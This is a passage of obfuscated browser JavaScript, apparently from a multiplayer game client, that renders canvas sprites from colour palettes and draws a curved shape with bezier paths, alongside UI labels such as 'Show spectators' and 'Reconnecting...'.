			ⵠⲆ[Ⲇ.ΔΔΔᐃΔⵠⵠ] = ⵠᐃⵠ(ΔΔᐃΔΔΔᐃ(.35 * ᐃ, ᐃⲆⲆᐃΔ, [ᐃᐃⵠⵠΔ, "#22E066"]));
			ⵠⲆ[Ⲇ.ᐃⲆΔΔⵠ] = [];
			ⵠⲆ[Ⲇ.ᐃⲆΔΔⵠ][Ⲇ.ⲆⵠΔ] = ⵠᐃⵠ(ΔⵠⵠⲆᐃᐃⵠ(ᐃ * .3, true, [ⵠ[187], "#65A8B7", ⵠ[361], "#14275B", "#081826", "#1A3163", "#0C1944", "#89C4CE", ⵠ[361]]));
			ⵠⲆ[Ⲇ.ᐃⲆΔΔⵠ][Ⲇ.ΔⲆΔ] = ⵠᐃⵠ(ΔⵠⵠⲆᐃᐃⵠ(.3 * ᐃ, true, [ⵠ[399], "#89C9C7", "#469E95", "#092C38", "#072021", "#0E343D", "#071F2D", "#9FD3D3", "#135367"]));
			ⵠⲆ[Ⲇ.ΔⵠᐃΔⲆ] = [];
			ⵠⲆ[Ⲇ.ΔⵠᐃΔⲆ][Ⲇ.ⲆⵠΔ] = ⵠᐃⵠ(ΔⲆⵠⵠᐃΔⵠ(ᐃ * .45, ᐃⲆⲆᐃΔ, ["#C4BC51", "#B29C32", "#201851", "#652D8E", ⵠ[187], ⵠ[361]]));
			ⵠⲆ[Ⲇ.ΔⵠᐃΔⲆ][Ⲇ.ΔⲆΔ] = ⵠᐃⵠ(ΔⲆⵠⵠᐃΔⵠ(ᐃ * .45, ᐃⲆⲆᐃΔ, ["#235050", "#357472", "#081B2D", ⵠ[409], ⵠ[399], "#135367"]));
			ⵠⲆ[Ⲇ.ⵠᐃΔⲆⲆ] = [];
			ⵠⲆ[Ⲇ.ⵠᐃΔⲆⲆ][Ⲇ.ⲆⵠΔ] = ⵠᐃⵠ(ⵠΔΔⵠΔᐃⲆ(.63 * ᐃ, true, [ⵠ[187], "#352E1E", ⵠ[371], ⵠ[261]]));
			ⵠⲆ[Ⲇ.ⵠᐃΔⲆⲆ][Ⲇ.ΔⲆΔ] = ⵠᐃⵠ(ⵠΔΔⵠΔᐃⲆ(ᐃ * .63, true, [ⵠ[399], "#071f22", ⵠ[533], ⵠ[149]]));
			ⵠⲆ[Ⲇ.ΔⲆΔⲆᐃ] = [];
			ⵠⲆ[Ⲇ.ΔⲆΔⲆᐃ][Ⲇ.ⲆⵠΔ] = ⵠᐃⵠ(ΔᐃⵠⵠⵠΔᐃ(ᐃ, ΔΔⲆⲆΔ, [ⵠ[187], "#332715", ⵠ[371], ⵠ[261]]));
			ⵠⲆ[Ⲇ.ΔⲆΔⲆᐃ][Ⲇ.ΔⲆΔ] = ⵠᐃⵠ(ΔᐃⵠⵠⵠΔᐃ(ᐃ, true, [ⵠ[399], "#071f22", ⵠ[533], ⵠ[149]]));
			ⵠⲆ[Ⲇ.ⲆⵠΔΔⵠ] = [];
			ⵠⲆ[Ⲇ.ⲆⵠΔΔⵠ][Ⲇ.ⲆⵠΔ] = ⲆΔ.ᐃΔᐃⵠⵠᐃⵠⲆⲆ;
			ⵠⲆ[Ⲇ.ⲆⵠΔΔⵠ][Ⲇ.ΔⲆΔ] = ⲆΔ.ΔⵠⲆᐃⵠΔⵠⲆⵠ;
			ⵠⲆ[Ⲇ.ⵠΔⲆᐃⵠ] = [];
			ⵠⲆ[Ⲇ.ⵠΔⲆᐃⵠ][Ⲇ.ⲆⵠΔ] = ⵠᐃⵠ(ᐃΔⲆᐃΔⵠᐃ(ᐃ * .59, ⵠⲆⵠⵠΔ, [ⵠ[111], ⵠ[384], ⵠ[430], ⵠ[157]]));
			ⵠⲆ[Ⲇ.ⵠΔⲆᐃⵠ][Ⲇ.ΔⲆΔ] = ⵠᐃⵠ(ᐃΔⲆᐃΔⵠᐃ(ᐃ * .59, ⵠᐃⲆᐃΔ, [ⵠ[399], "#062124", "#10373d", "#0f3333"]));
			ⵠⲆ[Ⲇ.ⲆⲆⵠⲆⵠⲆᐃ] = [ⵠⲆ[Ⲇ.ⵠΔⲆᐃⵠ]];
			ⵠⲆ[Ⲇ.ⲆⲆⵠⲆⵠⲆᐃ][ᐃΔᐃⲆ] = [];
			ⵠⲆ[Ⲇ.ⲆⲆⵠⲆⵠⲆᐃ][2] = [];
			ⵠⲆ[Ⲇ.ⲆⲆⵠⲆⵠⲆᐃ][ⵠⲆΔ][Ⲇ.ⲆⵠΔ] = ⵠᐃⵠ(ΔⵠᐃΔⲆⲆΔ(.59 * ᐃ, true, [ⵠ[111], ⵠ[384], ⵠ[430], ⵠ[157]]));
			ⵠⲆ[Ⲇ.ⲆⲆⵠⲆⵠⲆᐃ][ⵠⲆΔ][Ⲇ.ΔⲆΔ] = ⵠᐃⵠ(ΔⵠᐃΔⲆⲆΔ(ᐃ * .59, true, [ⵠ[399], "#062124", "#10373d", "#0f3333"]));
			ⵠⲆ[Ⲇ.ⲆⲆⵠⲆⵠⲆᐃ][ⲆⵠΔΔ][Ⲇ.ⲆⵠΔ] = ⵠᐃⵠ(ⵠᐃⲆΔⲆⵠᐃ(ᐃ * .59, ᐃⲆᐃᐃⲆ, [ⵠ[111], ⵠ[384], ⵠ[430], ⵠ[157]]));
			ⵠⲆ[Ⲇ.ⲆⲆⵠⲆⵠⲆᐃ][2][Ⲇ.ΔⲆΔ] = ⵠᐃⵠ(ⵠᐃⲆΔⲆⵠᐃ(ᐃ * .59, ᐃⲆᐃᐃⲆ, [ⵠ[399], "#062124", "#10373d", "#0f3333"]));
			ⵠⲆ[Ⲇ.ⵠⲆⲆⵠⵠ] = [];
			ⵠⲆ[Ⲇ.ⵠⲆⲆⵠⵠ][Ⲇ.ⲆⵠΔ] = ⵠᐃⵠ(ⲆΔⲆΔ(ⵠⵠⵠᐃ - Math.PI / 2, ⲆⵠΔⲆⵠΔΔ(ᐃ * .6, ⵠΔΔⵠΔⵠᐃ, [ⵠ[187], ⵠ[495], ⵠ[371], "#594225", ⵠ[154]])));
			ⵠⲆ[Ⲇ.ⵠⲆⲆⵠⵠ][Ⲇ.ΔⲆΔ] = ⵠᐃⵠ(ⲆΔⲆΔ(3 - Math.PI / ⲆⵠΔΔ, ⲆⵠΔⲆⵠΔΔ(.6 * ᐃ, ⲆⵠⲆᐃⲆΔΔ, [ⵠ[399], "#07383c", "#0c4e53", "#042b2e", "#0c5975", "#11546c"])));
			ⵠⲆ[Ⲇ.ᐃⵠⵠΔⵠⵠᐃ] = [];
			ⵠⲆ[Ⲇ.ᐃⵠⵠΔⵠⵠᐃ][Ⲇ.ⲆⵠΔ] = ⵠᐃⵠ(ⲆᐃⵠΔΔΔΔ(ᐃ * .3, ["#ad8850", "#714f24", "#9f7d4a", "#b38e59", "#8b1008"], ⲆΔⵠ));
			ⵠⲆ[Ⲇ.ᐃⵠⵠΔⵠⵠᐃ][Ⲇ.ΔⲆΔ] = ⵠᐃⵠ(ⲆᐃⵠΔΔΔΔ(ᐃ * .3, ["#1F5453", ⵠ[351], "#1D4947", "#1F5453", "#0c2629"], ΔΔⵠⵠ));
			ⵠⲆ[Ⲇ.ΔΔΔΔᐃᐃⵠ] = ⵠᐃⵠ(ⵠᐃᐃΔⵠⲆᐃⲆⵠ(.3 * ᐃ, ["#ad8850", "#714f24", "#9f7d4a", "#b38e59", "#413624"]));
			ⵠⲆ[Ⲇ.ᐃᐃⲆⵠᐃⲆⵠ] = ⵠᐃⵠ(ΔᐃᐃᐃΔΔΔΔⲆ(ᐃ * .3, [ⵠ[212]]));
			ⵠⲆ[Ⲇ.ⲆⲆᐃΔΔᐃᐃ] = ᐃⲆⲆᐃ(ᐃᐃⲆΔ, [{
				f: ⲆᐃΔⵠΔᐃΔ,
				x: Δⵠᐃ,
				y: Δᐃᐃⵠ,
				a: 1,
				r: Ⲇᐃᐃᐃ,
				c: ["#B3AA8E", "#817961", "#EBEAE2", "#E0DFD8"]
			}], .25, [ⵠ[257], ⵠ[43], ⵠ[370]], .7);
			ⵠⲆ[Ⲇ.ⲆᐃⵠΔΔ] = ᐃⲆⲆᐃ(1.5, [{
				f: ΔⵠⲆᐃΔΔᐃ,
				x: ΔⲆⵠⲆ,
				y: ⵠΔⲆⵠ,
				a: ΔⵠΔⵠ,
				r: 0,
				c: [ⵠ[66], "#750a0a", "#991616", ⵠ[66]]
			}], .45, ["#5bbcc9", "#73d2df", "#4daab6"], .9);
			ⵠⲆ[Ⲇ.ⵠΔⲆᐃⵠⲆᐃ] = ΔᐃⲆᐃΔⲆΔ(ᐃ * .35, ["#072428", "#67A242", "#67A242"], Δⵠᐃ);
			ⵠⲆ[Ⲇ.ΔⵠⲆⵠⵠᐃⵠ] = ΔᐃⲆᐃΔⲆΔ(.35 * ᐃ, ["#172130", "#649BB2", ⵠ[210], ⵠ[210], "#90C2D3", "#649BB2", "#84BDD1", "#2F5866"], ᐃⲆᐃ);
			ⵠⲆ[Ⲇ.ΔΔΔⲆⵠⲆᐃ] = ΔᐃⲆᐃΔⲆΔ(.35 * ᐃ, ["#3F0B11", "#B13424", ⵠ[210], "#B13424", "#7e180b"], ᐃⲆⵠᐃ);
			ⵠⲆ[Ⲇ.ᐃⲆⲆⵠⲆⲆⲆ] = ΔᐃⲆᐃΔⲆΔ(ᐃ * .35, ["#1B2F4C", "#29488E", "#76c3e8", ⵠ[407]], ΔΔᐃΔ);
			if (!ⲆᐃΔⵠⲆᐃⵠ) ⵠⲆ[Ⲇ.ⵠⵠᐃⲆΔᐃᐃ] = ⵠᐃⵠ(ᐃⵠᐃΔⵠⲆᐃⵠΔ(ᐃ));
			else ⵠⲆ[Ⲇ.ⵠⵠᐃⲆΔᐃᐃ] = ⵠᐃⵠ(ᐃᐃΔᐃΔⵠⲆⲆΔ(ᐃ));
			if (!ⲆᐃΔⵠⲆᐃⵠ) ⵠⲆ[Ⲇ.ⵠⵠⵠⲆᐃᐃΔ] = ⵠᐃⵠ(ⲆΔⲆⵠⲆⲆⵠⲆᐃ(ᐃ));
			else ⵠⲆ[Ⲇ.ⵠⵠⵠⲆᐃᐃΔ] = ⵠᐃⵠ(ⵠⵠⲆⵠΔⵠᐃⲆⵠ(.75));
			!ⲆᐃΔⵠⲆᐃⵠ ? ⵠⲆ[Ⲇ.ⵠᐃⵠΔⲆᐃᐃ] = ⵠᐃⵠ(ⲆⵠⵠⵠΔΔⲆ(ᐃ)) : ⵠⲆ[Ⲇ.ⵠᐃⵠΔⲆᐃᐃ] = ⵠᐃⵠ(ⲆⵠⵠⵠΔΔⲆ(.75));
			ⵠⲆ[Ⲇ.ⵠⵠⲆⲆΔᐃᐃ] = ⵠᐃⵠ(ᐃⲆᐃⵠⵠᐃΔ(ᐃ * .16, true, ["rgba(0, 0, 0, 0)", ⵠ[210], ⵠ[210], ⵠ[210], ⵠ[210]]));
			ⵠⲆ[Ⲇ.ᐃⲆΔⲆᐃᐃⲆ] = ⵠᐃⵠ(ⲆΔⲆΔ(5.8, ᐃᐃΔⵠⵠⲆⲆ(ᐃ * .15, ⲆΔΔⲆΔ, ["rgba(0, 0, 0, 0)", ⵠ[210], ⵠ[210], ⵠ[210], ⵠ[210]])));
			ⵠⲆ[Ⲇ.ᐃⲆ] = [];
			ⵠⲆ[Ⲇ.ⵠⵠⲆᐃΔⵠⲆ] = [];
			for (var ⵠᐃ = 0; ⵠᐃ < ΔᐃᐃΔ.ⲆΔⲆΔᐃⵠⲆ + ⵠΔⲆᐃ; ⵠᐃ++) ⵠⲆ[Ⲇ.ⵠⵠⲆᐃΔⵠⲆ][ⵠᐃ] = ᐃᐃΔΔᐃ(ᐃ, "" + (ⵠᐃ + 1), 12, ⵠ[253]);
			ⵠⲆ[Ⲇ.ⲆᐃᐃⲆΔᐃⵠ] = [];
			ⵠⲆ[Ⲇ.ⲆᐃᐃⲆΔᐃⵠ].push(ⵠᐃⵠ(ΔⵠΔΔᐃⲆⵠ(ᐃ * .12, ["#442F19", "#2C2112", ⵠ[240], ⵠ[531], ⵠ[530]])));
			ⵠⲆ[Ⲇ.ⲆᐃᐃⲆΔᐃⵠ].push(ⵠᐃⵠ(ΔⵠΔΔᐃⲆⵠ(.12 * ᐃ, ["#553b20", "#3e2f1a", "#d1ad7d", "#b3864c", ⵠ[530]], ⵠΔⵠΔ)));
			ⵠⲆ[Ⲇ.ⲆᐃᐃⲆΔᐃⵠ].push(ⵠᐃⵠ(ΔⵠΔΔᐃⲆⵠ(ᐃ * .12, ["#30200f", "#20180c", "#a78559", "#855f2f", "#b37d08"], ⵠΔᐃ)));
			ⵠⲆ[Ⲇ.ᐃⵠΔᐃⲆⲆᐃ] = [];
			ⵠⲆ[Ⲇ.ᐃⵠΔᐃⲆⲆᐃ].push(ⵠᐃⵠ(ΔΔⵠⵠᐃⵠⵠⵠᐃ(.22 * ᐃ)));
			ⵠⲆ[Ⲇ.ᐃⵠΔᐃⲆⲆᐃ].push(ⵠᐃⵠ(ⲆΔΔⵠⵠⵠᐃᐃⵠ(ᐃ * .22)));
			ⵠⲆ[Ⲇ.ᐃᐃⲆⲆⲆⲆⵠ] = ⵠᐃⵠ(ΔⲆᐃᐃⵠⲆⵠᐃΔ(ᐃ * .22));
			ⵠⲆ[Ⲇ.ⲆΔⵠⵠⲆ] = [];
			ⵠⲆ[Ⲇ.ⲆΔⵠⵠⲆ].push(ⵠᐃⵠ(ΔᐃᐃⵠΔⲆⲆ(ᐃ * 1.5, ["#795026", ⵠ[404], ⵠ[530]], Δⵠᐃ)));
			ⵠⲆ[Ⲇ.ⲆΔⵠⵠⲆ].push(ⵠᐃⵠ(ΔᐃᐃⵠΔⲆⲆ(1.5 * ᐃ, ["#8f5e2c", "#7a5126", ⵠ[530]], 1)));
			ⵠⲆ[Ⲇ.ⲆΔⵠⵠⲆ].push(ⵠᐃⵠ(ΔᐃᐃⵠΔⲆⲆ(ᐃ * 1.5, ["#67441f", "#573819", "#9c6e08"], 1)));
			ⵠⲆ[Ⲇ.ΔⵠⵠᐃⲆᐃⲆ] = ⲆΔ.ΔⵠⵠᐃⲆᐃⲆ;
			ⵠⲆ[Ⲇ.ΔᐃⲆΔⵠⵠΔ] = ⲆΔ.ΔᐃⲆΔⵠⵠΔ;
			ⵠⲆ[Ⲇ.ⵠᐃᐃΔΔᐃⵠ] = ⲆΔ.ⵠᐃᐃΔΔᐃⵠ;
			ⵠⲆ[Ⲇ.ⵠᐃΔⲆⵠⲆⲆ] = ⲆΔ.ⵠᐃΔⲆⵠⲆⲆ;
			ⵠⲆ[Ⲇ.ⲆⲆⲆⵠΔΔⵠ] = ᐃᐃΔΔᐃ(ᐃ, "Show spectators", 25, ⵠ[253], ΔⵠⲆᐃΔ, ⲆΔⵠⲆⲆ, ⵠ[481], ⲆΔΔᐃ, 220);
			ⵠⲆ[Ⲇ.ΔΔᐃΔⲆᐃᐃ] = ᐃᐃΔΔᐃ(ᐃ, "Reconnecting...", 30, ⵠ[253]);
			console.log(undefined, undefined)
		}

		function ⵠⲆⵠᐃⲆⵠⲆ(ᐃ, ᐃΔⲆΔ, Ⲇᐃ) {
			var Ⲇⵠ = document[ΔᐃⲆⵠⲆⵠΔ[224]](ⵠ[488]);
			var Δ = Ⲇⵠ.getContext(ⵠ[289]);
			Ⲇⵠ.width = ᐃ * 247;
			Ⲇⵠ.height = 247 * ᐃ;
			Δ.translate(0, ⲆⲆΔΔⲆⲆⵠ * ᐃ);
			Δ.globalAlpha = ᐃΔⲆΔ ? .5 : 1;
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ᐃⲆⵠΔ];
			Δ.moveTo(ᐃ * 150, 62 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 151.5, ᐃ * 71.5, ᐃ * 149, 70 * ᐃ, ᐃ * 153, 81 * ᐃ);
			Δ.bezierCurveTo(158 * ᐃ, 73.5 * ᐃ, 158 * ᐃ, ᐃ * 73.5, 163 * ᐃ, ᐃ * 66);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[0]);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(164 * ᐃ, ᐃ * 171);
			Δ.bezierCurveTo(ᐃ * 149, ᐃ * 159, ᐃ * 156.5, 165 * ᐃ, 149 * ᐃ, ᐃ * 159);
			Δ.bezierCurveTo(149 * ᐃ, ᐃ * 167, 149 * ᐃ, ᐃ * 170, 152 * ᐃ, 178 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[Δᐃᐃⵠ]);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(ᐃ * 132, ᐃ * 95);
			Δ.bezierCurveTo(ᐃ * 154, 102 * ᐃ, ᐃ * 154, ᐃ * 126, ᐃ * 137, 139 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 113, 152 * ᐃ, ᐃ * 89, 136 * ᐃ, ᐃ * 80, 121 * ᐃ);
			Δ.bezierCurveTo(57 * ᐃ, 89 * ᐃ, ᐃ * 69, 63 * ᐃ, ᐃ * 79, 52 * ᐃ);
			Δ.bezierCurveTo(110 * ᐃ, ᐃ * 20, 139 * ᐃ, ᐃ * 21, ᐃ * 150, 25 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 197, 36 * ᐃ, ᐃ * 221, 67 * ᐃ, 226 * ᐃ, 90 * ᐃ);
			Δ.bezierCurveTo(234 * ᐃ, ᐃ * 134, ᐃ * 214, 177 * ᐃ, 195 * ᐃ, ᐃ * 197);
			Δ.bezierCurveTo(ᐃ * 144, ᐃ * 242, ᐃ * 79, ᐃ * 216, 58 * ᐃ, ᐃ * 206);
			Δ.bezierCurveTo(13 * ᐃ, 174 * ᐃ, ᐃ * 20, ᐃ * 134, 23 * ᐃ, ᐃ * 107);
			Δ.bezierCurveTo(26 * ᐃ, 78 * ᐃ, ᐃ * 33, 60 * ᐃ, 38 * ᐃ, ᐃ * 43);
			Δ.bezierCurveTo(42 * ᐃ, 32 * ᐃ, 47 * ᐃ, ᐃ * 32, 50 * ᐃ, ᐃ * 36);
			Δ.bezierCurveTo(ᐃ * 54, 37 * ᐃ, 50 * ᐃ, 52 * ᐃ, 44 * ᐃ, 87 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 40, 115 * ᐃ, 46 * ᐃ, 142 * ᐃ, 57 * ᐃ, 158 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 76, ᐃ * 189, ᐃ * 129, ᐃ * 182, 152 * ᐃ, ᐃ * 173);
			Δ.bezierCurveTo(186 * ᐃ, 156 * ᐃ, 191 * ᐃ, ᐃ * 106, ᐃ * 176, 85 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 159, 61 * ᐃ, ᐃ * 132, 62 * ᐃ, ᐃ * 122, 66 * ᐃ);
			Δ.bezierCurveTo(108 * ᐃ, 74 * ᐃ, 108 * ᐃ, ᐃ * 89, 116 * ᐃ, ᐃ * 90);
			Δ.bezierCurveTo(123 * ᐃ, ᐃ * 92, ᐃ * 130, ᐃ * 93, ᐃ * 131, ᐃ * 94);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[0]);
			Δ.translate(Ⲇᐃᐃᐃ, -10 * ᐃ);
			Δ.globalAlpha = 1;
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ΔᐃΔⲆ];
			Δ.moveTo(ᐃ * 150, ᐃ * 62);
			Δ.bezierCurveTo(151.5 * ᐃ, 71.5 * ᐃ, ᐃ * 149, 70 * ᐃ, 153 * ᐃ, ᐃ * 81);
			Δ.bezierCurveTo(158 * ᐃ, ᐃ * 73.5, 158 * ᐃ, 73.5 * ᐃ, ᐃ * 163, ᐃ * 66);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ΔⵠⲆⲆ]);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ⵠᐃΔⲆ];
			Δ.moveTo(ᐃ * 164, 171 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 149, 159 * ᐃ, ᐃ * 156.5, 165 * ᐃ, ᐃ * 149, 159 * ᐃ);
			Δ.bezierCurveTo(149 * ᐃ, ᐃ * 167, 149 * ᐃ, ᐃ * 170, ᐃ * 152, 178 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[5]);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ⵠᐃΔⲆ];
			Δ.moveTo(ᐃ * 132, 95 * ᐃ);
			Δ.bezierCurveTo(154 * ᐃ, ᐃ * 102, 154 * ᐃ, ᐃ * 126, 137 * ᐃ, ᐃ * 139);
			Δ.bezierCurveTo(ᐃ * 113, ᐃ * 152, ᐃ * 89, ᐃ * 136, 80 * ᐃ, ᐃ * 121);
			Δ.bezierCurveTo(ᐃ * 57, ᐃ * 89, 69 * ᐃ, ᐃ * 63, ᐃ * 79, 52 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 110, ᐃ * 20, 139 * ᐃ, 21 * ᐃ, ᐃ * 150, ᐃ * 25);
			Δ.bezierCurveTo(197 * ᐃ, ᐃ * 36, ᐃ * 221, ᐃ * 67, ᐃ * 226, 90 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 234, ᐃ * 134, ᐃ * 214, 177 * ᐃ, ᐃ * 195, ᐃ * 197);
			Δ.bezierCurveTo(144 * ᐃ, ᐃ * 242, 79 * ᐃ, 216 * ᐃ, ᐃ * 58, ᐃ * 206);
			Δ.bezierCurveTo(ᐃⵠᐃΔⵠⵠΔⲆᐃ * ᐃ, 174 * ᐃ, ⵠⲆⲆⲆⲆ * ᐃ, 134 * ᐃ, ᐃ * 23, ᐃ * 107);
			Δ.bezierCurveTo(26 * ᐃ, ᐃ * 78, 33 * ᐃ, 60 * ᐃ, 38 * ᐃ, ᐃ * 43);
			Δ.bezierCurveTo(42 * ᐃ, ᐃ * 32, ᐃ * 47, 32 * ᐃ, 50 * ᐃ, 36 * ᐃ);
			Δ.bezierCurveTo(54 * ᐃ, ᐃ * 37, ᐃ * 50, 52 * ᐃ, 44 * ᐃ, 87 * ᐃ);
			Δ.bezierCurveTo(40 * ᐃ, ᐃ * 115, ᐃ * 46, 142 * ᐃ, ᐃ * 57, ᐃ * 158);
			Δ.bezierCurveTo(ᐃ * 76, ᐃ * 189, 129 * ᐃ, 182 * ᐃ, ᐃ * 152, ᐃ * 173);
			Δ.bezierCurveTo(186 * ᐃ, ᐃ * 156, 191 * ᐃ, 106 * ᐃ, 176 * ᐃ, ᐃ * 85);
			Δ.bezierCurveTo(ᐃ * 159, 61 * ᐃ, 132 * ᐃ, ᐃ * 62, 122 * ᐃ, 66 * ᐃ);
			Δ.bezierCurveTo(108 * ᐃ, ᐃ * 74, 108 * ᐃ, 89 * ᐃ, 116 * ᐃ, ᐃ * 90);
			Δ.bezierCurveTo(123 * ᐃ, 92 * ᐃ, ᐃ * 130, ᐃ * 93, ᐃ * 131, 94 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ⵠΔⲆ], Ⲇᐃ[2], 5 * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ⲆΔⲆᐃ];
			Δ.moveTo(137 * ᐃ, ᐃ * 137);
			Δ.bezierCurveTo(ᐃ * 145, 125 * ᐃ, 138 * ᐃ, ᐃ * 108, ᐃ * 123, 104 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 81, 101 * ᐃ, 88 * ᐃ, 77 * ᐃ, 98 * ᐃ, ᐃ * 65);
			Δ.bezierCurveTo(ᐃ * 117, ᐃ * 38, ᐃ * 138, ᐃ * 39, ᐃ * 165, ᐃ * 52);
			Δ.bezierCurveTo(ᐃ * 197, 72 * ᐃ, ᐃ * 207, ᐃ * 111, 197 * ᐃ, 140 * ᐃ);
			Δ.bezierCurveTo(182 * ᐃ, 180 * ᐃ, ᐃ * 161, ᐃ * 197, 112 * ᐃ, ᐃ * 194);
			Δ.bezierCurveTo(ᐃ * 58, ᐃ * 194, ᐃ * 37, ᐃ * 170, ᐃ * 34, 142 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 29, ᐃ * 102, 40 * ᐃ, ᐃ * 63, 51 * ᐃ, ᐃ * 45);
			Δ.bezierCurveTo(43 * ᐃ, 78 * ᐃ, 41 * ᐃ, ᐃ * 103, 43 * ᐃ, 122 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 51, 158 * ᐃ, 63 * ᐃ, 174 * ᐃ, 95 * ᐃ, ᐃ * 179);
			Δ.bezierCurveTo(ᐃ * 129, ᐃ * 186, 169 * ᐃ, ᐃ * 172, ᐃ * 177, 144 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 197, ᐃ * 105, 172 * ᐃ, ᐃ * 76, 160 * ᐃ, ᐃ * 71);
			Δ.bezierCurveTo(ᐃ * 125, 52 * ᐃ, ᐃ * 111, 73 * ᐃ, ᐃ * 111, ᐃ * 81);
			Δ.bezierCurveTo(106 * ᐃ, 93 * ᐃ, 140 * ᐃ, ᐃ * 92, ᐃ * 147, 107 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 153, 128 * ᐃ, ᐃ * 140, ᐃ * 135, ᐃ * 137, 139 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[3]);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ᐃᐃⲆᐃ];
			Δ.moveTo(ᐃ * 132, 95 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 154, ᐃ * 102, 154 * ᐃ, 126 * ᐃ, ᐃ * 137, ᐃ * 139);
			Δ.bezierCurveTo(113 * ᐃ, ᐃ * 152, ᐃ * 89, ᐃ * 136, ᐃ * 80, 121 * ᐃ);
			Δ.bezierCurveTo(57 * ᐃ, 89 * ᐃ, 69 * ᐃ, 63 * ᐃ, ᐃ * 79, ᐃ * 52);
			Δ.bezierCurveTo(ᐃ * 110, ᐃ * ᐃⲆᐃΔⵠ, 139 * ᐃ, 21 * ᐃ, ᐃ * 150, ᐃ * 25);
			Δ.bezierCurveTo(ᐃ * 197, ᐃ * 36, ᐃ * 221, ᐃ * 67, ᐃ * 226, 90 * ᐃ);
			Δ.bezierCurveTo(234 * ᐃ, ᐃ * 134, ᐃ * 214, ᐃ * 177, 195 * ᐃ, ᐃ * 197);
			Δ.bezierCurveTo(ᐃ * 144, 242 * ᐃ, 79 * ᐃ, ᐃ * 216, 58 * ᐃ, 206 * ᐃ);
			Δ.bezierCurveTo(ⵠΔΔⵠⲆ * ᐃ, ᐃ * 174, ᐃ * 20, 134 * ᐃ, 23 * ᐃ, 107 * ᐃ);
			Δ.bezierCurveTo(26 * ᐃ, 78 * ᐃ, 33 * ᐃ, 60 * ᐃ, ᐃ * 38, 43 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 42, 32 * ᐃ, 47 * ᐃ, ᐃ * 32, 50 * ᐃ, ᐃ * 36);
			Δ.bezierCurveTo(ᐃ * 54, ᐃ * 37, ᐃ * 50, 52 * ᐃ, ᐃ * 44, 87 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 40, 115 * ᐃ, 46 * ᐃ, 142 * ᐃ, ᐃ * 57, ᐃ * 158);
			Δ.bezierCurveTo(76 * ᐃ, 189 * ᐃ, 129 * ᐃ, ᐃ * 182, 152 * ᐃ, 173 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 186, ᐃ * 156, ᐃ * 191, ᐃ * 106, 176 * ᐃ, ᐃ * 85);
			Δ.bezierCurveTo(159 * ᐃ, 61 * ᐃ, ᐃ * 132, ᐃ * 62, ᐃ * 122, 66 * ᐃ);
			Δ.bezierCurveTo(108 * ᐃ, 74 * ᐃ, 108 * ᐃ, 89 * ᐃ, ᐃ * 116, ᐃ * 90);
			Δ.bezierCurveTo(ᐃ * 123, ᐃ * 92, ᐃ * 130, ᐃ * 93, 131 * ᐃ, 94 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, undefined, Ⲇᐃ[ΔⵠᐃⲆ], 5 * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⲆΔⲆᐃ];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(ᐃ * 82, ᐃ * 63);
			Δ.bezierCurveTo(91 * ᐃ, ᐃ * 64, 96 * ᐃ, 62 * ᐃ, 98 * ᐃ, ᐃ * 53);
			Δ.bezierCurveTo(91 * ᐃ, ᐃ * 45, ᐃ * 85, 42 * ᐃ, ᐃ * 78, 41 * ᐃ);
			Δ.bezierCurveTo(81 * ᐃ, ᐃ * 51, ᐃ * 82, 57 * ᐃ, ᐃ * 82, 63 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ⵠᐃᐃⲆ], Ⲇᐃ[5], 5 * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ᐃΔΔΔ];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(148 * ᐃ, ᐃ * 40);
			Δ.bezierCurveTo(140 * ᐃ, 52 * ᐃ, ᐃ * 131, ᐃ * 51, ᐃ * 123, 43 * ᐃ);
			Δ.bezierCurveTo(123 * ᐃ, 25 * ᐃ, 129 * ᐃ, 17 * ᐃ, 134 * ᐃ, ΔᐃΔΔΔΔⵠ * ᐃ);
			Δ.bezierCurveTo(138 * ᐃ, 35 * ᐃ, ᐃ * 142, 31 * ᐃ, ᐃ * 148, ᐃ * 40);
			Δ.closePath();
